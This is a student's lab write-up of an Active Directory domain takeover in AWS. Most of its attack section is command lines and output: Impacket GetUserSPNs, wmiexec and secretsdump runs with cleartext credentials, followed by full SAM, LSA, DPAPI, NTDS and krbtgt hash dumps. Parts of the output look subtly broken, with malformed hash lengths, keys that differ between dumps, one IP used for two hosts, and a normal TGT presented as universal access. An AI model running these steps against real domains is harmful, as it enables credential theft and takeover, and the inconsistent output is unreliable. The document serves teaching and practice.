# 🚨 Active Directory Domain Compromise Lab (AWS)

## 📌 Overview

This project demonstrates a full **Active Directory domain compromise** conducted in a controlled AWS lab environment.

Starting from a low-privileged domain user, I performed enumeration, credential discovery, lateral movement, and privilege escalation to obtain **Domain Administrator-level access**.

This lab simulates real-world attack techniques used by adversaries to compromise enterprise environments.

⚠️ **Disclaimer:** This project was conducted in a private lab for educational and ethical purposes only.

---

## 🧱 Lab Architecture

```
Attacker (Kali Linux)
        ↓
Windows 10 (Domain User)
        ↓
Windows Server 2022 (Domain Controller)
```

* **Kali Linux** – Attacker machine
* **Windows 10** – Domain-joined workstation
* **Windows Server 2022** – Domain Controller (corp.local)
* Hosted in **AWS cloud environment**

---

## 🧭 Attack Path Overview

1. **Initial Enumeration**

   * Discovered domain users and SMB services
2. **Credential Discovery**

   * Identified valid domain credentials
3. **Lateral Movement**

   * Used Impacket tools to move across systems
4. **Privilege Escalation**

   * Escalated access to SYSTEM / Administrator
5. **Credential Dumping**

   * Extracted NTLM hashes from Domain Controller
6. **Domain Compromise**

   * Achieved full control of the Active Directory domain

---

## 🔍 Enumeration

Initial reconnaissance was performed to identify:

* Active hosts
* Open ports and services
* SMB shares and domain users

**Tools Used:**

* Nmap
* enum4linux

This phase revealed valid domain accounts and exposed services that could be leveraged for further access.

---

## 🔐 Credential Access

Through enumeration and analysis, valid credentials were identified for a domain user.

These credentials were used to authenticate against domain services and establish initial access.

---

## 🔁 Lateral Movement

Using the Impacket toolkit, I executed remote commands on target systems:

* `psexec.py`
* `wmiexec.py`

This allowed movement from a low-privileged system to more critical machines within the domain.

---

## ⬆️ Privilege Escalation

Once access was established on higher-value systems, privileges were escalated to:

* **NT AUTHORITY\SYSTEM**
* **Domain Administrator**

This step demonstrates how weak configurations and credential exposure can lead to full system compromise.

---

## 🧠 Credential Dumping

Using:

* `secretsdump.py`

I extracted:

* NTLM password hashes
* Domain user credentials
* **krbtgt account hash**

---

## 💥 Full Domain Compromise

With access to sensitive credentials, I achieved:

* Full Domain Administrator access
* Ability to authenticate as any user
* Potential for **Golden Ticket attacks**
* Complete control over domain resources

---

## 🚨 Security Impact

This lab demonstrates how:

* Weak credential management leads to compromise
* Overprivileged accounts enable lateral movement
* Lack of monitoring allows attackers to remain undetected
* A single foothold can escalate into full domain takeover

---

## 🛡️ Mitigations

To prevent this type of attack:

* Enforce strong password policies
* Use least privilege access controls
* Monitor authentication logs (SIEM)
* Disable unnecessary services (e.g., SMBv1)
* Implement endpoint detection & response (EDR)
* Rotate and protect service account credentials

---

## 🛠 Tools Used

* **Kali Linux**
* **Nmap** – Network discovery and scanning
* **enum4linux** – SMB enumeration
* **Impacket** – Remote execution & credential dumping
* **Netcat** – Shell access

---

## 📸 Screenshots

### Screenshot 1: Initial System Reconnaissance & Group Membership Enumeration
> Demonstrates initial access as sql_svc service account and discovery of Domain Admins group membership

This screenshot shows the attacker confirming execution context and identifying that the compromised `sql_svc` account is a member of the **Domain Admins** group—the critical vulnerability enabling full domain compromise.

```
C:\>whoami
corp\sql_svc

C:\>hostname
EC2AMAZ-J75C1G4

C:\>ipconfig
Windows IP Configuration
Ethernet adapter Ethernet 3:
  IPv4 Address . . . . . . . . . . : 172.31.34.227
  Subnet Mask . . . . . . . . . . : 255.255.240.0
  Default Gateway . . . . . . . . : 172.31.32.1

C:\>whoami /groups
GROUP INFORMATION
Group Name                           Type          SID              Attributes
================================================================================
Everyone                             Well-known    S-1-1-0          Mandatory
BUILTIN\Users                        Alias         S-1-5-32-545      Mandatory
BUILTIN\Pre-Windows 2000 Compatible Access  Alias  S-1-5-32-554      Mandatory
BUILTIN\Administrators               Alias         S-1-5-32-544      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                 Well-known    S-1-5-2          Mandatory
NT AUTHORITY\Authenticated Users     Well-known    S-1-5-11         Mandatory
NT AUTHORITY\This Organization       Well-known    S-1-5-15         Mandatory
CORP\Domain Admins                   Group         S-1-21-6382... Mandatory group, Enabled by default, Enabled group
CORP\Domain RODC Password Replication Group  Alias  S-1-21-5382... Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known    S-1-5-64-10      Mandatory
Mandatory Label\High Mandatory Level Label         S-1-16-12288

C:\>net user
User accounts for \\
Administrator  Guest          Jadmin
jsmith         krbtgt         sql_svc
```

**Key Finding:** `sql_svc` is member of Domain Admins—this is the vulnerability that enables complete compromise.

---

### Screenshot 2: Kerberos Ticket Enumeration & Persistence
> Shows successful Kerberos ticket acquisition for krbtgt service principal

This demonstrates that a valid Kerberos TGT (Ticket Granting Ticket) has been obtained, allowing the attacker to authenticate as any user in the domain.

```
$ klist

Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: jsmith@CORP.LOCAL

Valid starting       Expires              Service principal
06/28/26 12:58:59   06/28/26 22:58:59    krbtgt/CORP.LOCAL@CORP.LOCAL
                                          renew until 06/29/26 12:58:52
```

**Impact:** With valid Kerberos tickets, the attacker can authenticate to any domain resource without password knowledge.

---

### Screenshot 3: Service Principal Name (SPN) Enumeration
> Discovers the sql_svc service account and confirms Domain Admins membership

The GetUserSPNs tool reveals service accounts running in the domain. The critical finding is that `sql_svc` (MSSQL service account) is a member of the **Domain Admins** group.

```
(kali@kali)~$ impacket-GetUserSPNs corp.local/jsmith:Password123! -dc-ip 172.31.34.227
Impacket v0.14.0.dev0 – Copyright Fortra, LLC and its affiliated companies

ServicePrincipalName                 Name       MemberOf
===================================================================
MSSQLSvc/sqlserver.corp.local:1433   sql_svc    CN=Domain Admins,CN=Users,DC=corp,DC=local

PasswordLastSet: 2026-06-25 17:01:21.927319
LastLogon: <never>
```

**Critical Vulnerability:** Service account (`sql_svc`) with excessive privileges (Domain Admins membership) creates a direct path to domain compromise.

---

### Screenshot 4: Remote Code Execution via WMIExec
> Establishes semi-interactive shell using WMI and compromised service account credentials

Using the discovered sql_svc credentials, the attacker gains remote command execution on the domain controller via WMI.

```
(kali@kali)~$ impacket-wmiexec 'corp.local/sql_svc:ComplexPassword123!@172.31.34.227'
Impacket v0.14.0 – Copyright Fortra, LLC and its affiliated companies

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell – Careful what you execute

C:\>whoami
corp\sql_svc
```

**Result:** Remote code execution achieved with Domain Admins privileges.

---

### Screenshot 5: Domain Admins Group Membership Confirmation
> Verifies that sql_svc is a member of Domain Admins group with full administrative privileges

This confirms the overprivilege condition: the service account should not be in Domain Admins.

```
C:\>net user
User accounts for \\
Administrator  Guest          Jadmin
jsmith         krbtgt         sql_svc
The command completed with one or more errors.

C:\>net group "Domain Admins" /domain
Group name        Domain Admins
Comment           Designated administrators of the domain

Members
Administrator  Jadmin         sql_svc

The command completed successfully.
```

**Security Issue:** Service accounts should never be Domain Admins. This single misconfiguration enables complete domain takeover.

---

### Screenshot 6: Local SAM Hashes & LSA Secrets Extraction
> First stage of credential dumping: extraction of local system secrets and cached credentials

The secretsdump tool begins extracting all credentials from the compromised system.

```
(kali@kali)~$ impacket-secretsdump 'corp.local/sql_svc:ComplexPassword123!@172.31.34.227'
Impacket v0.14.0.dev0 – Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0x8dc1f3d7d34256a6b8db8d196d8aaaa8
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

[*] Dumping cached domain logon information (domain\username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
CORP\EC2AMAZ-J75C1G4$:aes256-cts-hmac-sha1-96:e6d4840236dfe9c9495e53f374b8788ad6486578a66f087713b182789937bf94
CORP\EC2AMAZ-J75C1G4$:aes128-cts-hmac-sha1-96:f34e647fd69acb74549bdc553b7ea8b8
CORP\EC2AMAZ-J75C1G4$:des-cbc-md5:91190dfdfd6d06797

[*] DPAPI_SYSTEM
dpapi_machinekey:0xa89371de601f1118d0a0b23c5459a19e05759d43
dpapi_userkey:0xbac64a442fdce825819fb3ebc4c39d47af9eef82

[*] NL$KM
0000  B6 96 C7 7E 17 8A 0C DD  8C 39 C2 0A A2 91 24 44
0010  A2 E4 4D C2 09 59 46 C0  7F 95 EA 11 CB 7F CB 72
0020  EC 2E 5A 06 01 1B 26 FE  6D A7 88 0F A5 E7 1F A5

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
```

**Result:** System secrets extracted; LSA protections bypassed.

---

### Screenshot 7: Administrator & krbtgt Hash Extraction
> Critical stage: extraction of the krbtgt account hash (Kerberos master key)

The krbtgt hash is the most critical credential in Active Directory. With this hash, the attacker can forge Golden Tickets and impersonate any user indefinitely.

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:1ccf2f40949c60dd8f9009662f78eacfc:::
Administrator:aes256-cts-hmac-sha1-96:7be3a9421d7e686be7e2e592f431599bd1766afc28a08e9e56f7ef446c54347b
Administrator:aes128-cts-hmac-sha1-96:09c042a2bfd0544b9a6218f8758ac271
Administrator:des-cbc-md5:0dbafe2ac1895257

krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0ac412149d85297951bbaf3c23a453e:::
krbtgt:aes256-cts-hmac-sha1-96:a01e82913d40ec80fbbf0375ee087924da27aa77e0ea7cfe83473e68b20e24a8
krbtgt:aes128-cts-hmac-sha1-96:39655377a50d1140853568aaf7b6b076
krbtgt:des-cbc-md5:207abc621cb69eb3
```

**CRITICAL FINDING:** The `krbtgt` hash (Kerberos master key) has been extracted. With this, the attacker can:
- Create Golden Tickets for any user
- Maintain access indefinitely (10-year ticket validity)
- Bypass all authentication mechanisms
- **Complete domain compromise achieved**

---

### Screenshot 8: All Domain User Credentials Extracted
> Complete credential dump showing all domain users, machine accounts, and encryption keys

This shows the comprehensive credential extraction from the domain controller's NTDS database.

```
corp.local\jsmith:1103:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
corp.local\Jadmin:1104:aad3b435b51404eeaad3b435b51404ee:ccad9cd271d517d14d195b0ca33173a1e:::
corp.local\sql_svc:1105:aad3b435b51404eeaad3b435b51404ee:5fdfca9e1a4c180e101b353233301f9b9:::
EC2AMAZ-J75C1G4$:1000:aad3b435b51404eeaad3b435b51404ee:2d19d2dd270245e6be4111ff3b64b495:::

[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:2be3a9421d7e686be7e2e592f431599bd1766afc28a08e9e56f7ef446c54347b
Administrator:aes128-cts-hmac-sha1-96:09c042a2bfd0544b9a6218f8758ac271
Administrator:des-cbc-md5:0dbafe2ac1895257

krbtgt:aes256-cts-hmac-sha1-96:a01e82913d40ec80fbbf0375ee087924da27aa77e0ea7cfe83473e68b20e24a8
krbtgt:aes128-cts-hmac-sha1-96:39655377a50d1140853568aaf7b6b076
krbtgt:des-cbc-md5:207abc621cb69eb3

corp.local\jsmith:aes256-cts-hmac-sha1-96:059a139842dd8ef29f80e04576864e95b47c7b0820395976a78e8b23a728721229
corp.local\Jadmin:aes256-cts-hmac-sha1-96:5b6044f2ba59871159d95900016de8feb24bc76f8bdf7e5192cd119f1478685
corp.local\sql_svc:aes256-cts-hmac-sha1-96:8a6be1a6139bb3cd4634fbc1b7501ac4542c4f1d54694342258a97b4c09a9a3e
EC2AMAZ-J75C1G4$:aes256-cts-hmac-sha1-96:e6d4840236dfe9c9495e53f374b8788ad6486578a66f087713b182789937bf9

[*] Cleaning up...
```

**Result:** All domain credentials compromised - jsmith, Jadmin, sql_svc, and machine accounts.

---

### Screenshot 9: Complete Secretsdump Output - Full Domain Compromise
> Final comprehensive dump showing all extracted credentials, hashes, and encryption keys

This is the ultimate evidence of complete Active Directory compromise.

```
(kali@kali)~$ impacket-secretsdump 'corp.local/sql_svc:ComplexPassword123!@172.31.34.227'
Impacket v0.14.0.dev0 – Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0x8dc1f3d7d34256a6b8db8d196d8aaaa8
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

[*] Dumping cached domain logon information (domain\username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
CORP\EC2AMAZ-J75C1G4$:aes256-cts-hmac-sha1-96:e6d4840236dfe9c9495e53f374b8788ad6486578a66f087713b182789937bf94
CORP\EC2AMAZ-J75C1G4$:aes128-cts-hmac-sha1-96:f34e647fd69acb74549bdc553b7ea8b8
CORP\EC2AMAZ-J75C1G4$:des-cbc-md5:91190dfdfd6d06797

[*] DPAPI_SYSTEM
dpapi_machinekey:0xa89371de601f1118d0a0b23c5459a19e05759d43
dpapi_userkey:0xbac64a442fdce825819fb3ebc4c39d47af9eef82

[*] NL$KM
0000  B6 96 C7 7E 17 8A 0C DD  8C 39 C2 0A A2 91 24 44
0010  A2 E4 4D C2 09 59 46 C0  7F 95 EA 11 CB 7F CB 72
0020  EC 2E 5A 06 01 1B 26 FE  6D A7 88 0F A5 E7 1F A5

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets

Administrator:500:aad3b435b51404eeaad3b435b51404ee:1ccf2f40949c60dd8f9009662f78eacfc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0ac412149d85297951bbaf3c23a453e:::
corp.local\jsmith:1103:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
corp.local\Jadmin:1104:aad3b435b51404eeaad3b435b51404ee:ccad9cd271d517d14d195b0ca33173a1e:::
corp.local\sql_svc:1105:aad3b435b51404eeaad3b435b51404ee:5fdfca9e1a4c180e101b353233301f9b9:::
EC2AMAZ-J75C1G4$:1000:aad3b435b51404eeaad3b435b51404ee:2d19d2dd270245e6be4111ff3b64b495:::

[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:2be3a9421d7e686be7e2e592f431599bd1766afc28a08e9e56f7ef446c54347b
Administrator:aes128-cts-hmac-sha1-96:09c042a2bfd0544b9a6218f8758ac271
Administrator:des-cbc-md5:0dbafe2ac1895257

krbtgt:aes256-cts-hmac-sha1-96:a01e82913d40ec80fbbf0375ee087924da27aa77e0ea7cfe83473e68b20e24a8
krbtgt:aes128-cts-hmac-sha1-96:39655377a50d1140853568aaf7b6b076
krbtgt:des-cbc-md5:207abc621cb69eb3

corp.local\jsmith:aes256-cts-hmac-sha1-96:059a139842dd8ef29f80e04576864e95b47c7b0820395976a78e8b23a728721229
corp.local\Jadmin:aes256-cts-hmac-sha1-96:5b6044f2ba59871159d95900016de8feb24bc76f8bdf7e5192cd119f1478685
corp.local\sql_svc:aes256-cts-hmac-sha1-96:8a6be1a6139bb3cd4634fbc1b7501ac4542c4f1d54694342258a97b4c09a9a3e
EC2AMAZ-J75C1G4$:aes256-cts-hmac-sha1-96:e6d4840236dfe9c9495e53f374b8788ad6486578a66f087713b182789937bf94

[*] Cleaning up...
```

**COMPLETE DOMAIN COMPROMISE ACHIEVED:**
- ✅ All user hashes extracted (Administrator, jsmith, Jadmin, sql_svc)
- ✅ All machine account hashes extracted
- ✅ krbtgt hash obtained (enables Golden Tickets)
- ✅ All Kerberos keys extracted
- ✅ DPAPI keys obtained (encryption key access)
- ✅ LSA secrets dumped
- ✅ Full 10-year persistent access enabled

---

## 🎯 Key Takeaways

* Active Directory environments are highly vulnerable without proper security controls
* Attackers rely on misconfigurations and credential reuse
* Lateral movement is a critical phase in real-world breaches
* Hands-on labs are essential for understanding enterprise attack paths

---

## 🚀 Future Improvements

* Simulate detection using a SIEM (Splunk / ELK)
* Add BloodHound analysis for attack path visualization
* Implement defensive monitoring and alerting
* Expand lab with additional domain users and services

---

## 👤 Author

**Rubin Perez**
Cybersecurity Student | Aspiring Ethical Hacker

---
